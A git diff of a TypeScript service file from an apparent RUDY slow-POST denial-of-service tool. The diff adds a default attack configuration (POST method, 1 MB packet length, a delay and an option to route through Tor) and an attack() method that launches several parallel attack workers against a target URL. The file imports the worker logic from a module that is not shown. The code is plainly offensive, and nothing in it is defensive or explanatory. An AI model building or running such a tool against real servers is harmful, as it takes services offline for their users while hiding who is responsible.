@@ -1,45 +1,65 @@
 //
 //  rudy.service.ts
-//  Tribe-cms
+//  RUDY
 //
 //  Created by Sahil Chaddha on 08/05/2018.
-//  Copyright © 2018 Tribe-CMS.tv. All rights reserved.
+//  Copyright © 2018 RUDY. All rights reserved.
 //
 
 import logger, { LogLevel } from "../utils/logger"
 import * as Error from "../models/error.model"
-const logCategory: string = "RUDY_SERVICE"
+import { HTTPMethod } from "./network.service"
+import AttackService, { IAttackServiceResponsePayload } from "./attack.service"
+import IService from "./service"
+/* tslint:disable array-type object-literal-sort-keys */
 
 export interface IRudyConfig {
     target: string
+    method: HTTPMethod
+    packet_len: number
     maxConnections?: number
-    userAgent?: string
-    delay?: number
-    verbose?: boolean
+    delay: number
+    shouldUseTor: boolean
 }
 
-class RudyService {
+const defaultConfig: IRudyConfig = {
+    target: "http://localhost:80/",
+    method: HTTPMethod.POST,
+    packet_len: 1 * 1024 * 1024, // 1 MB
+    maxConnections: 5,
+    delay: 2,
+    shouldUseTor: false,
+}
+
+class RudyService implements IService {
+    public serviceName: string = "Rudy_Service"
     private config: IRudyConfig
-
+    private attacks: AttackService[]
     constructor(config: IRudyConfig) {
-        this.config = config
-        this.setLogLevel()
+        this.config = defaultConfig
+        this.mapConfig(config)
+        this.attacks = []
     }
 
-    public attack(): Promise<boolean> {
-        logger.info({message: "Starting Attack at " + this.config.target, category: "RUDY"})
-        return this.isValidTarget(this.config.target)
-    }
-
-    private setLogLevel() {
-        if (this.config.verbose) {
-            logger.setLogLevel(LogLevel.VERBOSE)
+    public attack() {
+        for (var i = 0; i < this.config.maxConnections; i++) {
+            const attackService = new AttackService({target: this.config.target, method: this.config.method,
+                                                     packet_len: this.config.packet_len, delay: this.config.delay,
+                                                     shouldUseTor: this.config.shouldUseTor, attackId: i})
+            attackService.attack()
+            this.attacks.push(attackService)
         }
+
+        logger.info({message: "Attack Started at " + this.config.target + " With Workers : " +
+                     this.config.maxConnections,
+                     category: this.serviceName})
     }
 
-    private isValidTarget(target: string): Promise<boolean> {
-        return new Promise<boolean>((resolve, reject) => {
-            reject({message: "hihi", category: "joj"})
+    private mapConfig(config: IRudyConfig) {
+        Object.keys(config).forEach((key, index) => {
+            if (config[key] != null) {
+                this.config[key] = config[key]
+            }
         })
     }
 }
